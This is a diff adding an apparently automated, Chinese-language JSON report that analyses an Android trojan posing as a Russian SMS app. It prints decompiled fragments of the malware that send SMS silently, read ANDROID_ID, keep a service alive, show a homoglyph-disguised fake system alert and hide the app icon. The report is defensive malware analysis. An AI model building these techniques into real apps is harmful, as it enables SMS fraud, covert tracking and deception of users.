@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "ed2007c3b031391c1ff9117e3f166ebf2b34a4dd3045ca1f4de4251bad88e5a2.apk",
+    "sha256": "ed2007c3b031391c1ff9117e3f166ebf2b34a4dd3045ca1f4de4251bad88e5a2",
+    "包名": "com.thaw.perfume",
+    "应用名": "СМC - Сообщение",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 281.4
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\thaw\\perfume\\Develop;",
+          "method_signature": "onStartCommand(Intent intent, int i, int i2)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void onDestroy() {\n    super.onDestroy();\n    b();\n    stopSelf();\n}\npublic int onStartCommand(Intent intent, int i, int i2) {\n    return 1;\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public void onDestroy() {\n>>>         super.onDestroy();\n>>>         b();\n>>>         stopSelf();\n>>>     }\n>>> \n>>>     @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n          return 1;\n      }\n  }",
+          "behavior_description": "该代码为Service生命周期方法：onStartCommand返回1（即START_STICKY），使服务被系统杀死后会自动重启重建；onDestroy中先调用b()（疑似重新拉起服务或注册定时任务的保活逻辑）再stopSelf()。这是典型的服务持久化保活机制，确保后台服务（疑似承载C2通信/远程控制功能的恶意服务）在被用户或系统终止后持续存活，为恶意样本的隐蔽驻留和C2通道持续运行提供支撑。代码片段本身未展示直接的网络通信数据流，属于支撑性保活行为，需结合该Service其他方法（如b()及网络请求逻辑）确认实际C2通信。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\thaw\\perfume\\d;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "try {\n    SelfSmell.a(true);\n    SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n} catch (Exception e) {\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             SelfSmell.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n      }\n  \n      public static void a(Context context, boolean z) {",
+          "behavior_description": "该方法封装了静默短信发送功能：目标号码(str)和短信内容(str2)作为参数传入（由恶意程序内部逻辑或C2指令控制），直接调用 SmsManager.getDefault().sendTextMessage() 在后台发送短信，全程无用户交互、无系统UI提示。发送前调用 SelfSmell.a(true) 进行辅助初始化，并用空的 try-catch 静默吞掉所有异常以避免崩溃暴露。结合该样本为已确认恶意软件（伪装成Messages应用、滥用AccessibilityService的木马）以及同类代码中存在 setRepeating 定时任务调度，该行为典型用于增值业务订阅扣费、短信欺诈或向通讯录联系人传播垃圾短信，可直接造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\thaw\\perfume\\d;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10426) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 从系统 ContentResolver 中读取 ANDROID_ID 设备唯一标识符，对感染设备进行指纹采集。数据流向：Settings.Secure 系统设置（设备标识数据源）→ 方法返回值（供恶意程序其他模块调用，用于设备识别、受害者追踪及与C2服务器的会话/设备标识）。结合厂商报告，该样本为伪装成短信应用、滥用 AccessibilityService 的间谍软件，此指纹采集行为服务于恶意软件对受害设备的标识与追踪。此外同类中还包含按时间间隔（约10秒阈值10426ms）隐蔽拉起 Volume 组件（FLAG_ACTIVITY_NEW_TASK）的可疑控制逻辑，进一步佐证该类属于恶意代码模块。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\thaw\\perfume\\Develop;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"com.thaw.perfume.CONTEMPORARY\", \"Delicate\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"com.thaw.perfume.CONTEMPORARY\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oснoвной процeсс\").setContentText(\"Сиcтемa нe кoррeктнo рaбoтaeт, вaм неoбхoдимо включить дoступ к cтaтиcтикe для 'Oснoвной процeсс'\");\nstartForeground(164, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() throws IllegalAccessException, InvocationTargetException {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"com.thaw.perfume.CONTEMPORARY\", \"Delicate\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.thaw.perfume.CONTEMPORARY\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oснoвной процeсс\").setContentText(\"Сиcтемa нe кoррeктнo рaботaeт, вaм неoбхoдимо включить доступ к стaтистике для 'Oснoвной процeсс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(164, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码通过 startForeground(164) 将恶意服务提升为前台服务实现进程持久化保活，防止恶意进程被系统回收。通知标题'Основной процесс'（主进程）及正文'系统工作不正常，需开启统计访问权限'均使用西里尔字母与拉丁字母的同形异码字（homoglyph）混淆，一方面规避安全检测的字符串匹配，另一方面伪装成系统进程并制造虚假系统错误提示，社工诱导用户授予无障碍/统计等敏感权限。该手法与Zscaler报告所述伪装为'Messages'、利用AccessibilityService窃密的间谍木马完全吻合，是恶意样本持久化驻留的关键组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\thaw\\perfume\\Wording;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Wording.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Wording extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Wording.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该Activity在onCreate()中调用a()，通过PackageManager.setComponentEnabledSetting()将自身组件Wording设置为禁用状态（newState=2即COMPONENT_ENABLED_STATE_DISABLED，flags=1即DONT_KILL_APP），随后立即finish()退出。由于Wording是应用的主入口（Launcher Activity），禁用该组件后应用图标将从桌面消失，用户无法察觉应用存在也难以正常卸载。结合厂商报告，该样本伪装为'Сообщениe'（短信）应用并滥用AccessibilityService监控用户，图标隐藏为其隐蔽驻留和持续窃密提供掩护，属于典型的恶意规避行为。数据流向：应用自身启动器组件信息→setComponentEnabledSetting()禁用主入口组件实现图标隐藏。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
